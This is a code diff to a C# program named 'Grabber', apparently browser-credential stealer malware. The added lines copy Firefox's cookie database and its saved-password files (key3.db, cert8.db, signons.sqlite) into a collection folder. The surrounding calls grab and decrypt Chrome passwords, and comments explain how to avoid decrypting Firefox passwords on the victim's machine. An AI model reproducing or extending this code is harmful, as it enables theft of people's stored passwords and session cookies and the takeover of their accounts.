@@ -37,8 +37,13 @@ namespace Grabber
 
             bool chromeExists = grabChromeData(cd, home);
             if (chromeExists) decryptChromePasswords(cd, home);
+            //chrome passwords can only be decrypted on local machine
+
 
             bool firefoxExists = grabFireFoxData(cd, home);
+            //firefox passwords do not need to be decrypted
+            //firefox will decrypt them for you
+            //work smarter, not harder
         }
 
 
@@ -174,7 +179,14 @@ namespace Grabber
 
                     Directory.CreateDirectory(cd + "\\Firefox\\" + profileName);
 
-                    File.Copy(profile + "\\cookies.sqlite", cd + "\\Firefox\\" + profileName + "\\cookies.sqlite");
+                    //Cookies
+                    File.Copy(profile + "\\cookies.sqlite", cd + "\\Firefox\\" + profileName + "\\cookies.sqlite", true);
+
+                    //Passwords
+                    File.Copy(profile + "\\key3.db", cd + "\\Firefox\\" + profileName + "\\key3.db", true);
+                    File.Copy(profile + "\\cert8.db", cd + "\\Firefox\\" + profileName + "\\cert8.db", true);
+                    File.Copy(profile + "\\signons.sqlite", cd + "\\Firefox\\" + profileName + "\\signons.sqlite", true);
+
                 }
 
 
